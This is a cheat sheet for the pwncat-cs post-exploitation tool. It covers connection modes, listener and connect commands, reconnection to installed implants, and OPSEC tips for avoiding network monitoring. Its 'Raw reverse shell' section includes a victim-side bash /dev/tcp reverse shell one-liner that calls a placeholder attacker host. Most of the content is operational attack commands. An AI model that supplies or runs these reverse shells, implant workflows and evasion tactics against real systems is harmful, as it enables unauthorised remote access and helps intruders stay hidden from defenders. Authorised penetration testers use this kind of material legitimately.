# pwncat Connection Modes & OPSEC

## Connection Mode Matrix

| Mode | Syntax | Use case | OPSEC note |
|---|---|---|---|
| `bind` (catch reverse shell) | `pwncat-cs -lp 4444` | Standard callback from victim | Listener can be detected by network monitoring |
| `connect` (to bind shell) | `pwncat-cs connect://10.10.10.10:4444` | Victim exposes bind shell | Inbound target service may be noisy |
| `ssh` | `pwncat-cs user@10.10.10.10` | Legit credentialed access | Most stable + least brittle shell |
| `ssl-bind` | `pwncat-cs --ssl -lp 4444` | Encrypted callback listener | Better against passive interception |
| `ssl-connect` | `pwncat-cs --ssl 10.10.10.10 4444` | Encrypted connect to bind shell | Requires SSL-wrapped shell on victim |

## Protocol Assumptions (important)

pwncat infers protocol from syntax if not explicit.

- `user@host` → assumes `ssh`
- `host port` without user → assumes `connect`
- `:port` or `-l` listener style → assumes `bind`
- `--ssl` + listener style → assumes `ssl-bind`

If you want deterministic behavior in engagements, prefer explicit protocols:

```bash
pwncat-cs bind://0.0.0.0:4444
pwncat-cs connect://10.10.10.10:4444
pwncat-cs ssh://user:password@10.10.10.10
```

## Reverse Shell Catching Patterns

### Raw reverse shell

```bash
# listener
pwncat-cs -lp 4444

# victim
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

### Encrypted reverse shell

```bash
# listener with auto self-signed cert
pwncat-cs --ssl -lp 4444

# listener with explicit cert/key
pwncat-cs ssl-bind://0.0.0.0:4444?certfile=/path/cert.pem&keyfile=/path/key.pem
```

## Reconnect Workflow (Implants)

If implants were installed, pwncat can reconnect automatically.

```bash
# list known implants
pwncat-cs --list

# reconnect by host ID (most reliable)
pwncat-cs <host-id>

# reconnect by host/user
pwncat-cs user@10.10.10.10
```

## OPSEC Guidance

- Prefer `ssh` channel when credentials are available (most stable, least suspicious behavior drift).
- Prefer `ssl-bind` over raw `bind` when callback visibility matters.
- Use explicit protocols in scripts to avoid accidental wrong-mode connections.
- Avoid long-lived listeners on obvious ports (`4444`, `5555`) in monitored environments.
- After operation, remove implants and verify cleanup (`run implant remove`).

## Source Pointers

- `usage` docs: connection string syntax, protocol assumptions, reconnect behavior
- `persist` docs: implant lifecycle and reconnect listing
